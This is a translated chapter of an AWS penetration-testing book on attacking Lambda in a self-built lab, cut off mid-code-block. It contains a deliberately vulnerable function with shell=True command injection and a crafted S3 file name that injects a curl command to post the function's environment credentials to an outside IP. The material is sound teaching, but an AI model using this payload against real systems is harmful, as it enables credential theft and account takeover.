# Kali Linux AWS 渗透测试实用指南（三）

> 原文：[`annas-archive.org/md5/25FB30A9BED11770F1748C091F46E9C7`](https://annas-archive.org/md5/25FB30A9BED11770F1748C091F46E9C7)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第五部分：对其他 AWS 服务进行渗透测试

在本节中，我们将研究各种常见的 AWS 服务，针对它们的不同攻击方式，以及如何保护它们。

本节将涵盖以下章节：

+   第十二章，*AWS Lambda 的安全和渗透测试*

+   第十三章，*AWS RDS 的渗透测试和安全*

+   第十四章，*针对其他服务*


# 第十二章：AWS Lambda 的安全性和渗透测试

AWS Lambda 是一个令人惊叹的服务，为用户提供无服务器函数和应用程序。基本上，您创建一个带有要执行的代码的 Lambda 函数，然后创建某种触发器，每当触发该触发器时，您的 Lambda 函数将执行。用户只需支付 Lambda 函数运行所需的时间，最长为 15 分钟（但可以根据每个函数的需要手动降低）。Lambda 提供了多种编程语言供您的函数使用，甚至允许您设置自己的运行时以使用它尚不直接支持的语言。在我们深入研究所有这些之前，我们应该澄清无服务器是什么。尽管无服务器听起来好像没有涉及服务器，但 Lambda 基本上只是为函数需要运行的持续时间启动一个隔离的服务器。因此，仍然涉及服务器，但作为用户，您不需要处理服务器的规划、加固等。

对攻击者来说，这意味着我们仍然可以执行代码，使用文件系统，并执行大多数您可以在常规服务器上执行的其他活动，但有一些注意事项。其中之一是整个文件系统被挂载为只读，这意味着您无法直接修改系统上的任何内容，除了`/tmp`目录。`/tmp`目录是提供给 Lambda 函数在执行过程中根据需要写入文件的临时位置。另一个是您无法在这些服务器上获得 root 权限。简单明了，您只需接受您将永远成为 Lambda 函数中的低级用户。如果您确实找到了提升为 root 用户的方法，我相信 AWS 安全团队的人会很乐意听到这个消息。

在现实世界中，您可能会使用 Lambda 的一个示例场景是对上传到特定 S3 存储桶的任何文件进行病毒扫描。每次上传文件到该存储桶时，Lambda 函数将被触发，并传递上传事件的详细信息。然后，函数可能会将该文件下载到`/tmp`目录，然后使用 ClamAV（[`www.clamav.net/`](https://www.clamav.net/)）之类的工具对其进行病毒扫描。如果扫描通过，执行将完成。如果扫描标记文件为病毒，它可能会删除 S3 中相应的对象。

在本章中，我们将涵盖以下主题：

+   设置一个易受攻击的 Lambda 函数

+   使用读取访问攻击 Lambda 函数

+   使用读写访问攻击 Lamda 函数

+   转向虚拟私有云

# 设置一个易受攻击的 Lambda 函数

S3 中用于病毒扫描文件的 Lambda 函数的先前示例与我们将在自己的环境中设置的类似，但更复杂。我们指定的 S3 存储桶上传文件时，我们的函数将被触发，然后下载该文件，检查内容，然后根据发现的内容在 S3 对象上放置标签。这个函数将有一些编程错误，使其容易受到利用，以便进行演示，所以不要在生产账户中运行这个函数！

在我们开始创建 Lambda 函数之前，让我们首先设置将触发我们函数的 S3 存储桶和我们函数将承担的 IAM 角色。导航到 S3 仪表板（单击服务下拉菜单并搜索 S3），然后单击“创建存储桶”按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b9113130-2785-4746-a8a8-999b47ef9ea9.png)

S3 仪表板上的“创建存储桶”按钮

现在，给您的存储桶一个唯一的名称；我们将使用 bucket-for-lambda-pentesting，但您可能需要选择其他内容。对于地区，我们选择美国西部（俄勒冈州），也称为 us-west-2。然后，单击“下一步”，然后再次单击“下一步”，然后再次单击“下一步”。将这些页面上的所有内容保留为默认设置。现在，您应该看到您的 S3 存储桶的摘要。单击“创建存储桶”以创建它：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/23b01b13-0858-49ba-92a4-eadfe7664eb8.png)

单击的最终按钮以创建您的 S3 存储桶

现在，在您的存储桶列表中显示存储桶名称时，单击该名称，这将完成我们的 Lambda 函数的 S3 存储桶设置（暂时）。

在浏览器中保留该选项卡打开，并在另一个选项卡中打开 IAM 仪表板（服务| IAM）。在屏幕左侧的列表中单击“角色”，然后单击左上角的“创建角色”按钮。在选择受信任实体类型下，选择 AWS 服务，这应该是默认值。然后，在“选择将使用此角色的服务”下，选择 Lambda，然后单击“下一步：权限”：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e605c290-0a64-4bf5-a8fb-8b333713d7b1.png)

为我们的 Lambda 函数创建一个新角色

在此页面上，搜索 AWS 托管策略`AWSLambdaBasicExecutionRole`，并单击其旁边的复选框。此策略将允许我们的 Lambda 函数将执行日志推送到 CloudWatch，并且从某种意义上说，这是 Lambda 函数应该提供的最低权限集。可以撤销这些权限，但是 Lambda 函数将继续尝试写日志，并且将继续收到访问被拒绝的响应，这对于观察的人来说会很嘈杂。

现在，搜索 AWS 托管策略`AmazonS3FullAccess`，并单击其旁边的复选框。这将使我们的 Lambda 函数能够与 S3 服务进行交互。请注意，对于我们的 Lambda 函数用例来说，此策略过于宽松，因为它允许对任何 S3 资源进行完全的 S3 访问，而从技术上讲，我们只需要对我们的单个 bucket-for-lambda-pentesting S3 存储桶进行少量的 S3 权限。通常，您会发现在攻击的 AWS 帐户中存在过度授权的资源，这对于您作为攻击者来说没有任何好处，因此这将成为我们演示场景的一部分。

现在，单击屏幕右下角的“下一步：标记”按钮。我们不需要向此角色添加任何标记，因为这些通常用于我们现在需要担心的其他原因，所以只需单击“下一步：立即审阅”。现在，为您的角色创建一个名称；对于此演示，我们将其命名为`LambdaRoleForVulnerableFunction`，并且我们将保留角色描述为默认值，但如果您愿意，可以在其中编写自己的描述。现在，通过单击屏幕右下角的“创建角色”来完成此部分。如果一切顺利，您应该会在屏幕顶部看到成功消息：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/43a084b8-68c6-4fd8-ab95-65f27053d85d.png)

我们的 IAM 角色已成功创建

最后，我们可以开始创建实际的易受攻击的 Lambda 函数。要这样做，请转到 Lambda 仪表板（服务| Lambda），然后单击“创建函数”，这应该出现在欢迎页面上（因为可能您还没有创建任何函数）。请注意，这仍然位于美国西部（俄勒冈州）/ us-west-2 地区，就像我们的 S3 存储桶一样。

然后，在顶部选择从头开始。现在，为您的函数命名。对于此演示，我们将其命名为`VulnerableFunction`。接下来，我们需要选择我们的运行时，可以是各种不同的编程语言。对于此演示，我们将选择 Python 3.7 作为我们的运行时。

对于角色选项，请选择选择现有角色，然后在现有角色选项下，选择我们刚刚创建的角色（LambdaRoleForVulnerableFunction）。最后，单击右下角的“创建函数”：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8694b8c0-c1eb-4cbd-9196-047d9f9cee33.png)

我们新的易受攻击的 Lambda 函数设置的所有选项

现在，您应该进入新易受攻击函数的仪表板，该仪表板可让您查看和配置 Lambda 函数的各种设置。

目前，我们可以暂时忽略此页面上的大部分内容，但是如果您想了解有关 Lambda 本身的更多信息，我建议您阅读 AWS 用户指南：[`docs.aws.amazon.com/lambda/latest/dg/welcome.html`](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html)。现在，向下滚动到“函数代码”部分。我们可以看到“处理程序”下的值是`lambda_function.lambda_handler`。这意味着当函数被调用时，`lambda_function.py`文件中名为`lambda_handler`的函数将作为 Lambda 函数的入口点执行。`lambda_function.py`文件应该已经打开，但如果没有，请在“函数代码”部分左侧的文件列表中双击它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/922ccc81-4968-4ff3-b55b-6ab9768b7bff.png)

Lambda 函数处理程序及其引用的值

如果您选择了不同的编程语言作为函数的运行时，您可能会遇到略有不同的格式，但总体上它们应该是相似的。

现在我们已经有了 Lambda 函数、Lambda 函数的 IAM 角色和我们创建的 S3 存储桶，我们将在我们的 S3 存储桶上创建事件触发器，每次触发时都会调用我们的 Lambda 函数。要做到这一点，返回到您的 bucket-for-lambda-pentesting S3 存储桶所在的浏览器选项卡，单击“属性”选项卡，然后向下滚动到“高级设置”下的选项，单击“事件”按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/79acebbb-ca45-4849-a784-d4bc0a804b90.png)

访问我们 S3 存储桶的事件设置

接下来，单击“添加通知”，并将此通知命名为`LambdaTriggerOnS3Upload`。在“事件”部分下，选中“所有对象创建事件”旁边的复选框，这对我们的需求已经足够了。对于此通知，我们将希望将“前缀”和“后缀”留空。单击“发送到”下拉菜单，并选择“Lambda 函数”，然后应该显示另一个下拉菜单，您可以在其中选择我们创建的函数`VulnerableFunction`。最后，单击“保存”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/21d55ec4-ab79-43b6-9599-92d21a346d6b.png)

我们想要的新通知配置

单击“保存”后，**事件**按钮应显示 1 个活动通知：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/03ddc31b-ac53-4e0e-af6f-65e75a248fe4.png)

我们刚刚设置的通知。

如果您返回到 Lambda 函数仪表板并刷新页面，您应该看到 S3 已被添加为左侧“设计”部分中我们 Lambda 函数的触发器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/13b360a6-5717-4302-b326-75bb3cd3e3c6.png)

Lambda 函数知道它将被我们刚刚设置的通知触发

基本上，我们刚刚告诉我们的 S3 存储桶，每当创建一个对象（`/uploaded/`等），它都应该调用我们的 Lambda 函数。S3 将自动调用 Lambda 函数，并通过`event`参数传递与通过`event`参数传递的上传文件相关的详细信息，这是我们的函数接受的两个参数之一（`event`和`context`）。Lambda 函数可以通过在执行过程中查看`event`的内容来读取这些数据。

要完成我们易受攻击的 Lambda 函数的设置，我们需要向其中添加一些易受攻击的代码！在 Lambda 函数仪表板上，在“函数代码”下，用以下代码替换默认代码：

```
import boto3
import subprocess
import urllib

def lambda_handler(event, context):
    s3 = boto3.client('s3')

    for record in event['Records']:
        try:
            bucket_name = record['s3']['bucket']['name']
            object_key = record['s3']['object']['key']
            object_key = urllib.parse.unquote_plus(object_key)

            if object_key[-4:] != '.zip':
                print('Not a zip file, not tagging')
                continue

            response = s3.get_object(
                Bucket=bucket_name,
                Key=object_key
            )

            file_download_path = f'/tmp/{object_key.split("/")[-1]}'
            with open(file_download_path, 'wb+') as file:
                file.write(response['Body'].read())

            file_count = subprocess.check_output(
                f'zipinfo {file_download_path} | grep ^- | wc -l',
                shell=True,
                stderr=subprocess.STDOUT
            ).decode().rstrip()
            s3.put_object_tagging(
                Bucket=bucket_name,
                Key=object_key,
                Tagging={
                    'TagSet': [
                        {
                            'Key': 'NumOfFilesInZip',
                            'Value': file_count
                        }
                    ]
                }
            )
        except Exception as e:
            print(f'Error on object {object_key} in bucket {bucket_name}: {e}')
    return
```

当我们继续阅读本章时，我们将更深入地了解这个函数的运行情况。简单来说，每当文件上传到我们的 S3 存储桶时，这个函数就会被触发；它将确认文件是否具有`.zip`扩展名，然后将文件下载到`/tmp`目录中。下载完成后，它将使用`zipinfo`、`grep`和`wc`程序来计算 ZIP 文件中存储了多少文件。然后它将向 S3 中的对象添加一个标签，指定该 ZIP 文件中有多少个文件。你可能已经能够看到一些问题可能出现的地方，但我们稍后会讨论这些问题。

我们要做的最后一件事是下拉到 Lambda 仪表板的环境变量部分，并添加一个带有键`app_secret`和值`1234567890`的环境变量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/aed37b17-a967-4953-b477-aa5c0c6db456.png)

将 app_secret 环境变量添加到我们的函数中。

要完成本节，只需点击屏幕右上角的大橙色保存按钮，将此代码保存到您的 Lambda 函数中，我们就可以继续了。

# 使用只读访问攻击 Lambda 函数

要开始本章的只读访问部分，我们将创建一个具有特定权限集的新 IAM 用户。这是我们将用来演示攻击的用户，因此我们可以假设我们以某种方式刚刚窃取了这个用户的密钥。这些权限将允许对 AWS Lambda 进行只读访问，并允许向 S3 上传对象，但不会超出此范围。我们不会详细介绍创建用户、设置其权限并将其密钥添加到 AWS CLI 的整个过程，因为我们在之前的章节中已经涵盖了这些内容。

因此，请继续创建一个具有对 AWS 的编程访问权限的新 IAM 用户。对于这个演示，我们将命名该用户为`LambdaReadOnlyTester`。接下来，我们将添加一个自定义的内联 IAM 策略，使用以下 JSON 文档：

```
{
    "Version": "2012-10-17",
     "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "lambda:List*",
                "lambda:Get*",
                "s3:PutObject"
            ],
            "Resource": "*"
        }
    ]
}
```

正如你所看到的，我们可以使用任何以`List`或`Get`开头的 Lambda API，以及使用 S3 的`PutObject` API。这就像我在许多 AWS 环境中看到的情况，用户对各种资源具有广泛的读取权限，然后还有一些额外的 S3 权限，比如上传文件的能力。

在作为攻击者查看 AWS Lambda 时，首先要做的是获取账户中每个 Lambda 函数的所有相关数据。这可以通过 Lambda 的`ListFunctions` API 来完成。对于这个演示，我们已经知道我们想要攻击的函数在`us-west-2`，但在实际情况下，你可能想要检查每个区域是否有可能感兴趣的 Lambda 函数。我们将首先运行以下 AWS CLI 命令：

```
aws lambda list-functions --profile LambdaReadOnlyTester --region us-west-2
```

我们应该得到一些有用的信息。首先要查找的是环境变量。我们自己设置了这个有漏洞的函数，所以环境变量对我们来说并不是什么秘密，但作为攻击者，你经常可以发现存储在函数的环境变量中的敏感信息。这些信息在我们刚刚进行的`ListFunctions`调用中以`"Environment"`键的形式返回给我们，对于我们的有漏洞的函数，它应该看起来像这样：

```
"Environment": {
    "Variables": {
        "app_secret": "1234567890"
    }
}
```

你可以指望在 Lambda 函数的环境变量中发现各种意想不到的东西。作为攻击者，`"app_secret"`的值听起来很有趣。在过去的渗透测试中，我在环境变量中发现了各种秘密，包括用户名/密码/第三方服务的 API 密钥，AWS API 密钥到完全不同的账户，以及更多。仅仅查看几个 Lambda 函数的环境变量就让我多次提升了自己的权限，因此重要的是要注意存储的内容。我们自己设置了这个有漏洞的函数，所以我们知道`"app_secret"`环境变量对我们来说没有什么用，但它被包含在其中是为了演示这个想法。

在运行 Lambda `ListFunctions` API 调用时，如果函数设置了环境变量，`"Environment"`键将只包括在结果中；否则，它不会显示在结果中，所以如果那里没有任何内容可用，不要担心。

在检查环境变量之后，现在是查看每个 Lambda 函数的代码的好时机。要从 AWS CLI 中执行此操作，我们可以使用从`ListFunctions`获得的函数列表，并将每个函数通过 Lambda `GetFunction` API 调用运行。对于我们的易受攻击函数，我们可以运行以下命令：

```
aws lambda get-function --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2
```

输出将看起来像运行`ListFunctions`时为每个函数返回的内容，但有一个重要的区别，即添加了`Code`键。这个键将包括`RepositoryType`和`Location`键，这是我们将代码下载到这个函数的方式。我们只需要复制 Code | Location 下的 URL 并粘贴到我们的网络浏览器中。提供的 URL 是一个预签名的 URL，它给了我们访问存储 Lambda 代码的 S3 存储桶的权限。访问页面后，它应该会下载一个以`VulnerableFunction`开头的`.zip`文件。

如果您解压文件，您会看到一个名为`lambda_function.py`的单个文件，其中存储了 Lambda 函数的代码。在许多情况下，那里会有多个文件，如第三方库、配置文件或二进制文件。

尽管我们的易受攻击函数相对较短，但我们将以它是大量代码的方式来处理，因为我们不能仅仅手动快速分析来模拟真实情况，因为您可能不熟悉 Lambda 函数使用的编程语言。

将函数解压到我们的计算机上后，我们现在将开始对包含的代码进行静态分析。我们知道这个函数正在运行 Python 3.7，因为当我们运行`ListFunctions`和`GetFunction`时，`Runtime`下列出了 Python 3.7，并且主文件是一个`.py`文件。代码的静态分析有许多选项，免费和付费的，它们在不同的编程语言之间有所不同，但我们将使用`Bandit`，它被描述为一个旨在发现 Python 代码中常见安全问题的工具。在继续之前，请注意，仅仅因为我们在这里使用它，并不一定意味着它是最好的和/或完美的。我建议您进行自己的研究，并尝试不同的工具，找到自己喜欢的工具，但 Bandit 是我个人喜欢使用的工具之一。Bandit 托管在 GitHub 上[`github.com/PyCQA/bandit`](https://github.com/PyCQA/bandit)。

Bandit 的安装很简单，因为它是通过 PyPI 提供的，这意味着我们可以使用 Python 包管理器`pip`来安装它。按照 Bandit GitHub 上的说明，我们将运行以下命令（一定要自行检查，以防有任何更新）：

```
virtualenv bandit-env
pip3 install bandit
```

我们使用`virtualenv`，以避免安装 Python 依赖项时出现任何问题，然后我们使用`pip3`来安装`bandit`，因为我们要分析的代码是用 Python 3 编写的。在撰写本文时，安装了 Bandit 版本 1.5.1，因此如果在本节的其余部分遇到任何问题，请注意您自己安装的版本。安装完成后，我们可以切换到解压 Lambda 函数的目录，然后使用`bandit`命令来针对包含我们代码的文件夹。我们可以使用以下命令来执行：

```
bandit -r ./VulnerableFunction/
```

现在 Lambda 函数将被扫描，`-r`标志指定递归，即扫描`VulnerableFunction`文件夹中的每个文件。我们现在只有一个文件，但了解这个标志对我们正在扫描的更大的 Lambda 函数有什么作用是很有用的。Bandit 完成后，我们将看到它报告了三个单独的问题：一个低严重性和高置信度，一个中等严重性和中等置信度，一个高严重性和高置信度：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6ad0c8d1-f53a-4200-a6a4-b49304c6b2e2.png)

Bandit 输出的结果

通常，静态源代码分析工具会输出相当数量的误报，因此重要的是要逐个检查每个问题，以验证它是否是一个真正的问题。静态分析工具也缺乏代码可能如何使用的上下文，因此安全问题可能对某些代码是一个问题，但对其他代码来说并不重要。在审查 Bandit 提出的第二个问题时，我们将更多地关注上下文。

查看 Bandit 报告的第一个问题，我们可以看到消息“考虑与子进程模块相关的可能安全影响”，这是非常有道理的。子进程模块用于在计算机上生成新进程，如果操作不正确可能会造成安全风险。我们将把这标记为一个有效问题，但在审查代码时要牢记这一点。

Bandit 报告的第二个问题告诉我们“可能不安全地使用了临时文件/目录”，并向我们显示了代码的行，其中一个变量被赋予了`/tmp`目录中文件路径的值，附加了另一个变量`object_key`。这是一个安全问题，在某些应用程序中可能是一个大问题，但考虑到我们 Lambda 函数的上下文，我们可以假设在这种情况下这不是一个问题。为什么？安全风险的一部分是可能有用户能够控制文件路径。用户可能会插入路径遍历序列或者欺骗脚本将临时文件写入其他位置，比如`/etc/shadow`，这可能会带来危险的后果。这对我们来说不是一个问题，因为代码在 Lambda 中运行，这意味着它在只读文件系统上运行；所以，即使有人能够遍历出`/tmp`目录，函数也无法覆盖系统上的任何重要文件。这里可能会出现其他可能的问题，但对我们来说没有直接适用的，所以我们可以把这个问题划掉为误报。

接下来是 Bandit 提出的最后一个最严重的问题，它告诉我们“识别出了使用 shell=True 的子进程调用，存在安全问题”，听起来很有趣。这告诉我们正在生成一个新进程，并且可以访问操作系统的 shell，这可能意味着我们可以注入 shell 命令！看看 Bandit 标记的行（第 30 行），我们甚至可以看到一个 Python 变量（`file_download_path`）直接连接到正在运行的命令中。这意味着如果我们可以以某种方式控制该值，我们可以修改在操作系统上运行的命令以执行任意代码。

接下来，我们想看看`file_download_path`在哪里被赋值。我们知道它的赋值出现在 Bandit 的问题＃2（第 25 行），代码如下：

```
file_download_path = f'/tmp/{object_key.split("/")[-1]}'
```

就像第 30 行的字符串一样，这里使用了 Python 3 的`f`字符串（有关更多信息，请参见[`docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals`](https://docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals)），它基本上允许您在字符串中嵌入变量和代码，因此您不必进行任何混乱的连接，使用加号或其他任何东西。我们在这里看到的是`file_download_path`是一个字符串，其中包含代码中的另一个变量`object_key`，它在其中的每个`"/"`处被拆分。然后，`[-1]`表示使用从`"/"`拆分而成的列表的最后一个元素。

现在，如果我们追溯`object_key`变量，看看它是在哪里被赋值的，我们可以看到在第 13 行，它被赋值为`record['s3']['object']['key']`的值。好的，我们可以看到函数期望`event`变量包含有关 S3 对象的信息（以及第 11 行的 S3 存储桶）。我们想弄清楚是否可以以某种方式控制该变量的值，但考虑到我们作为攻击者的上下文，我们不知道这个函数是否会定期被调用，也不知道如何调用。我们可以检查的第一件事是我们的 Lambda 函数是否有任何事件源映射。可以使用以下命令来完成这个任务：

```
aws lambda list-event-source-mappings --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2
```

在这种情况下，我们应该得到一个空列表，如下所示：

```
{
    “EventSourceMappings”: []
}
```

事件源映射基本上是将 Lambda 函数连接到另一个服务的一种方式，以便在该服务中发生其他事情时触发它。事件源映射的一个示例是 DynamoDB，每当 DynamoDB 表中的项目被修改时，它就会触发一个 Lambda 函数，并包含被添加到表中的内容。正如您所看到的，我们当前的函数没有与此相关的内容，但现在不是恐慌的时候！并非每个自动触发源都会显示为事件源映射。

下一步将是查看 Lambda 函数的资源策略，它基本上指定了谁可以调用此函数。要获取资源策略，我们将使用`GetPolicy` API：

```
aws lambda get-policy --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2
```

如果我们幸运的话，我们将得到一个 JSON 对象作为对此 API 调用的响应，但如果没有，我们可能会收到 API 错误，指示找不到资源。这将表明没有为 Lambda 函数设置资源策略。如果是这种情况，那么我们可能无法以任何方式调用此 Lambda 函数，除非我们碰巧拥有`lambda:InvokeFunction`权限（但在这种情况下我们没有）。

今天一定是我们的幸运日，因为我们得到了一个策略。它应该看起来像下面这样，只是`000000000000`将被您自己的 AWS 帐户 ID 替换，修订 ID 将不同：

```
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"s3.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:000000000000:function:VulnerableFunction\",\"Condition\":{\"StringEquals\":{\"AWS:SourceAccount\":\"000000000000\"},\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:s3:::bucket-for-lambda-pentesting\"}}}]}",
    "RevisionId": "d1e76306-4r3a-411c-b8cz-6x4731qa7f00"
}
```

混乱且难以阅读，对吧？这是因为一个 JSON 对象被存储为一个字符串，作为另一个 JSON 对象中一个键的值。为了使这一点更清晰，我们可以复制`"Policy"`键内的整个值，删除转义字符（`\`），并添加一些漂亮的缩进，然后我们将得到这样的结果：

```
{
    "Version": "2012-10-17",
    "Id": "default",
    "Statement": [
        {
            "Sid": "000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul",
            "Effect": "Allow",
            "Principal": {
                "Service": "s3.amazonaws.com"
            },
            "Action": "lambda:InvokeFunction",
            "Resource": "arn:aws:lambda:us-west-2:000000000000:function:VulnerableFunction",
            "Condition": {
                "StringEquals": {
                    "AWS:SourceAccount": "000000000000"
                },
                "ArnLike": {
                    "AWS:SourceArn": "arn:aws:s3:::bucket-for-lambda-pentesting"
                }
            }
        }
    ]
}
```

看起来好多了，不是吗？我们正在查看一个 JSON 策略文档，指定了什么可以调用这个 Lambda 函数，我们可以看到`"Action"`设置为`"lambda:InvokeFunction"`。接下来，我们可以看到`"Principal"`设置为 AWS 服务 S3。这听起来正确，因为我们知道该函数正在处理 S3 对象。在`"Resource"`下，我们看到了 Lambda 函数的 ARN，正如预期的那样。在`"Condition"`下，我们看到`"AWS:SourceAccount"`必须是`000000000000`，这是我们正在使用的账户 ID，所以很好。在`"Condition"`下还有`"ArnLike"`，显示了一个 S3 存储桶的 ARN。我们没有所需的 S3 权限去确认这些信息，但我们可以合理地假设某种 S3 事件已经设置好，当发生某些事情时会调用这个函数（我们知道这是真的，因为我们之前设置过）。

另一个重要的提示可以在`"Sid"`键中找到，我们可以看到值为`"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul"`，这显示了`"LambdaTriggerOnS3Upload"`。现在我们可以做出一个合理的猜测，即当文件上传到 S3 存储桶`"bucket-for-lambda-pentesting"`时，将调用这个 Lambda 函数。如果你还记得我们设置这些资源时，`"LambdaTriggerOnS3Upload"`就是我们之前添加到 S3 存储桶的事件触发器的名称，所以在这种情况下，冗长的命名方案帮助了我们作为攻击者。更好的是，我们知道我们的受损用户被授予了`"s3:PutObject"`权限！

现在我们已经拼出了这个谜题的所有部分。我们知道 Lambda 函数运行一个带有变量（`file_download_path`）的 shell 命令，我们知道该变量由另一个变量（`object_key`）组成，我们知道该变量被设置为值`record['s3']['object']['key']`。我们还知道，每当文件上传到`"bucket-for-lambda-pentesting"` S3 存储桶时，就会调用这个 Lambda 函数，而且我们有必要的权限将文件上传到该存储桶。鉴于这一切，这意味着我们可以上传一个我们选择的文件，最终将其传递到一个 shell 命令中，这正是我们想要的，如果我们试图在系统上执行代码！

但是，等等；在运行 Lambda 函数的服务器上执行任意代码有什么好处呢？它是一个只读文件系统，而且我们已经有了源代码。更多的凭证，这就是好处！如果你还记得之前，我们需要创建一个 IAM 角色，附加到我们创建的 Lambda 函数上，然后允许我们的函数与 AWS API 进行身份验证。当 Lambda 函数运行时，它会假定附加到它的 IAM 角色，并获得一组临时凭证（记住，这是访问密钥 ID、秘密访问密钥和会话令牌）。Lambda 函数与 EC2 实例有些不同，这意味着没有`http://169.254.169.254`上的元数据服务，这意味着我们无法通过那里检索这些临时凭证。Lambda 的做法不同；它将凭证存储在环境变量中，所以一旦我们能在服务器上执行代码，我们就可以窃取这些凭证，然后我们将获得附加到 Lambda 函数的角色的所有权限。

在这种情况下，我们知道 LambdaRoleForVulnerableFunction IAM 角色具有完全的 S3 访问权限，这比我们微不足道的`PutObject`访问权限要多得多，它还具有一些 CloudWatch 日志权限。我们目前无法访问 CloudWatch 中的日志，所以我们需要将凭证窃取到我们控制的服务器上。否则，我们将无法读取这些值。

现在，让我们开始我们的有效载荷。有时，如果您将整个 Lambda 函数复制到自己的 AWS 帐户中，可能会有所帮助，这样您就可以使用有效载荷对其进行轰炸，直到找到有效的有效载荷，但我们将首先手动尝试。我们知道我们基本上控制`object_key`变量，最终将其放入 shell 命令中。因此，如果我们传入一个无害的值`"hello.zip"`，我们将看到以下内容：

```
Line 13: object_key is assigned the value of "hello.zip"

Line 14: object_key is URL decoded by urllib.parse.unquote_plus (Note: the reason this line is in the code is because the file name comes in with special characters URL encoded, so those need to be decoded to work with the S3 object directly)

Line 25: file_download_path is assigned the value of f'/tmp/{object_key.split("/")[-1]}', which ultimately resolves to "/tmp/hello.zip"

Lines 29-30: A shell command is run with the input f'zipinfo {file_download_path} | grep ^- | wc -l', which resolves to "zipinfo /tmp/hello.zip | grep ^- | wc -l".
```

似乎只有一个限制需要我们担心，那就是代码检查文件是否在第 16 行具有`.zip`扩展名。有了所有这些信息，我们现在可以开始制作恶意有效载荷。

`zipinfo /tmp/hello.zip`命令中直接包含了我们提供的字符串，因此我们只需要打破这个命令以运行我们自己的任意命令。如果我们将`hello.zip`更改为`hello;sleep 5;.zip`，那么最终命令将变成`"zipinfo /tmp/hello;sleep 5;.zip | grep ^- | wc -l"`。我们插入了几个分号，这会导致 shell 解释器（bash）认为有多个要执行的命令。不是运行单个命令`zipinfo /tmp/hello.zip`，而是运行`"zipinfo /tmp/hello"`，这将失败，因为那不是一个存在的文件；然后，它将运行`"sleep 5"`并休眠五秒，然后它将运行`".zip"`，这不是一个真正的命令，因此将抛出错误。

就像这样，我们已经将一个命令(`sleep 5`)注入到 Lambda 服务器的 shell 中。现在，因为这是盲目的（也就是说，我们看不到任何命令的输出），我们需要窃取我们想要的重要信息。支持 Lambda 函数的操作系统默认安装了`"curl"`，因此这将是进行外部请求的一种简单方法，我们知道 AWS 凭证存储在环境变量中，因此我们只需要`curl`凭证到我们控制的服务器。

为此，我在自己的服务器上设置了 NetCat 监听器（示例中的 IP 地址为`1.1.1.1`），端口为`80`，命令如下：

```
nc -nlvp 80
```

然后，我们将制定一个有效载荷，将窃取凭证。我们可以使用`"env"`命令访问环境变量，因此用 curl 向我们的外部服务器发出 HTTP POST 请求的一般命令，其中包括所有环境变量作为主体，如下所示：

```
curl -X POST -d "`env`" 1.1.1.1
```

这可能看起来有点奇怪，但因为`"env"`命令提供多行内容，所以需要将其放入引号中，否则它将破坏整个命令（尝试在自己的服务器上运行`"curl -X POST -d env 1.1.1.1"`并查看结果）。如果您不熟悉，反引号（`` ` ``）指示 bash 在执行整个`curl`命令之前运行`"env"`命令，这样它就会将这些变量`POST`到我们的外部服务器。此外，因为我们的服务器正在侦听端口`80`，所以我们不需要在`curl`命令中包括`http://`或端口，因为给定一个IP地址，默认情况下转到`http://1.1.1.1:80`. 这样我们可以避免很多不必要的字符。这可能不一定是一种传统的方法，但这个字符串的好处在于它很容易放入文件名，这正是我们利用这个 Lambda 函数所需要的！

回到我们的有效载荷；现在，我们需要将一个文件上传到 S3，文件名称如下：

```

hello;curl -X POST -d "`env`" 1.1.1.1;.zip

```

由于其中有双引号，Microsoft Windows 不允许您创建具有这个名称的文件，但在 Linux 中很容易做到。我们可以使用`touch`命令来创建文件。它看起来像这样：

```

touch 'hello;curl -X POST -d "`env`" 1.1.1.1;.zip'

```

上述命令的输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/215c8c00-1f95-48dd-b752-e4274bc82d14.png)

在我们自己的 Ubuntu 服务器上创建一个恶意名称的文件

现在一切都准备就绪了。我们只需确保我们的 NetCat 监听器已经在我们的外部服务器上启动，然后将此文件上传到 `bucket-for-lambda-pentesting` S3 存储桶，然后等待 Lambda 函数被调用，最后等待我们的恶意命令执行。我们可以通过使用 S3 `copy` AWS CLI 命令将我们的本地恶意文件复制到远程 S3 存储桶来上传它：

```

